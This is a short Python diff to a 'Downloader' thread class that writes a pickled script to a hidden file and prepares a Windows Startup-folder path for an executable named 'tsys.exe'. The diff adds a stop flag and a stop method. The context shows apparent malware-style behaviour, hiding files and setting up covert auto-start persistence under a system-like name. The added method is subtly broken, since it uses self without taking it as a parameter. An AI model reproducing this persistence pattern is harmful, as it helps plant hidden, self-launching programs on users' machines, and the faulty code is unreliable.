@@ -26,6 +26,7 @@ class Downloader(threading.Thread):
         launcher.unhide_file(path)
         f = open(path, "w")
         #Save the script
+        if self._stop.is_set(): return
         cPickle.dump(self.script, f)
         #Hide the script
         f.close()
@@ -37,4 +38,6 @@ class Downloader(threading.Thread):
             shellcon.CSIDL_STARTUP, 
             "tsys.exe")
         
-        def
+        def stop():
+            """Stop the thread"""
+            self._stop.set()
